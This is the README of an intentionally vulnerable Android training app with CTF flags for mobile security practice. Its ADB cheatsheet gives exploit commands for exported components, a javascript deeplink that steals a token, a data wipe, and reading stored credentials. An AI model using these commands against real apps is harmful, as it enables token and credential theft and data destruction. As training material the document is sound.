# Gu3ssWeak

A deliberately vulnerable Android application for mobile security research, bug bounty practice, and CTF-style learning. Contains 18 documented vulnerabilities mapped to the OWASP Mobile Top 10.

---

## Quick Start

    git clone git@github.com:b4sith-sec/VulnDroid.git
    cd VulnDroid
    ./gradlew assembleDebug
    adb install -r app/build/outputs/apk/debug/app-debug.apk

Launch the app, work through each lab, capture flags, and submit them on the in-app CTF scoreboard.

---

## Lab Categories

| Category | Vulnerabilities | Flags |
|---|---|---|
| WebView | WV-01 to WV-05 | 5 |
| Deeplink | DL-01 to DL-04, DL-CHAIN | 5 |
| Auth / SQL Injection | SQL-01 | 1 |
| Admin Panel | AP-01 to AP-03 | (covered by AP-01) |
| Broadcast Receiver | BR-01 to BR-03 | 2 |
| Service | SV-01, SV-02a, SV-02b | 2 |
| Network Interception | NET-01 | 1 |
| Banking / OTP | OTP-01 | 1 |
| LFI | LFI-01 | 1 |
| Storage | STORE-01 | 1 |

18 flags total, plus a master flag awarded for capturing all of them.

---

## CTF Flow

1. Open the app - lands directly on the lab list.
2. Pick a lab, exploit the vulnerability (via UI, ADB, or both).
3. Each successful exploit auto-captures its flag.
4. Tap "Submit Flag" to confirm, or check progress on "CTF Scoreboard".
5. Capture all 18 flags to unlock the master flag.

---

## Documentation

- [ARCHITECTURE.md](ARCHITECTURE.md) - How each vulnerable component works internally
- [MITIGATIONS.md](MITIGATIONS.md) - Fix and remediation guidance for every vulnerability, including LFI-to-RCE escalation concepts
- [SECURITY.md](SECURITY.md) - Security policy and responsible disclosure
- [CHECKSUMS.txt](CHECKSUMS.txt) - SHA256 checksums for built APKs

---

## ADB Exploit Cheatsheet

    # Admin panel - exported, no permission
    adb shell am start -n com.vulndroid.app/.activities.AdminPanelActivity

    # Token injection via broadcast
    adb shell am broadcast -a com.vulndroid.app.SEND_TOKEN --es token FAKE --es user attacker

    # Data wipe via exported service
    adb shell am startservice -n com.vulndroid.app/.services.DataSyncService --es action wipe_user_data

    # Deeplink to WebView RCE chain
    adb shell am start -a android.intent.action.VIEW -d "vulndroid://settings?redirect=com.vulndroid.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"

    # Read plaintext stored credentials
    adb shell run-as com.vulndroid.app cat /data/data/com.vulndroid.app/shared_prefs/login_prefs.xml

    # Watch for logged secrets
    adb logcat | grep Gu3ssWeak

---

## Disclaimer

This project is purely educational. All vulnerabilities are intentional and documented. Techniques shown here apply to real apps, but only test systems you own or are authorized to test. See [SECURITY.md](SECURITY.md) for the full disclaimer and responsible disclosure guidance.

## License

MIT - see [LICENSE](LICENSE).
